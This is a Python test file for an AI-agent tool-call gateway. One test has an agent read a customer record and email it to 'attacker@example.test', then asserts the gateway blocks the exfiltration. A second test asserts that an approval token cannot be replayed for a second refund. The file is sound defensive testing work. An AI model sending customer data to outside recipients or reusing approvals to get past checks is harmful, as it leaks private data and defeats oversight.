from __future__ import annotations

from agentgate.models import Action, DecisionAction, TaskContract, ToolCall


async def test_sensitive_data_is_blocked_before_external_sink(gateway) -> None:
    contract = TaskContract(
        principal="support",
        goal="inspect customer and send a notice",
        allowed_actions={Action.READ, Action.TRANSMIT},
        allowed_resources={"customer:C001", "message"},
        allowed_effects={"data_read", "external_transmission"},
        external_transmission=True,
        allowed_destinations={"attacker@example.test"},
        confirmed_actions={Action.TRANSMIT},
    )
    first = await gateway.execute(
        ToolCall(
            tool_name="database.query_customers",
            arguments={"customer_id": "C001", "limit": 1},
            principal="support",
            session_id="flow",
        ),
        contract,
    )
    email = first.result.output[0]["email"]
    second = await gateway.execute(
        ToolCall(
            tool_name="messaging.send_email",
            arguments={
                "recipient": "attacker@example.test",
                "subject": "record",
                "body": email,
            },
            principal="support",
            session_id="flow",
        ),
        contract,
    )
    assert second.decision.action == DecisionAction.DENY
    assert "sensitive_source_to_external_sink" in second.decision.risk_types


async def test_approval_token_is_single_use(gateway) -> None:
    contract = TaskContract(
        principal="finance",
        goal="refund order A102 once",
        allowed_actions={Action.WRITE},
        allowed_resources={"order:A102"},
        allowed_effects={"state_change", "financial_transaction"},
        approval_tokens={"once"},
    )
    call = ToolCall(
        tool_name="business.refund_order",
        arguments={"order_id": "A102", "amount": 10},
        principal="finance",
        session_id="replay",
        approval_token="once",
    )
    first = await gateway.execute(call, contract)
    second = await gateway.execute(call.model_copy(update={"call_id": "second"}), contract)
    assert first.decision.action == DecisionAction.ALLOW
    assert second.decision.action == DecisionAction.DENY
    assert "approval_replay" in second.decision.risk_types
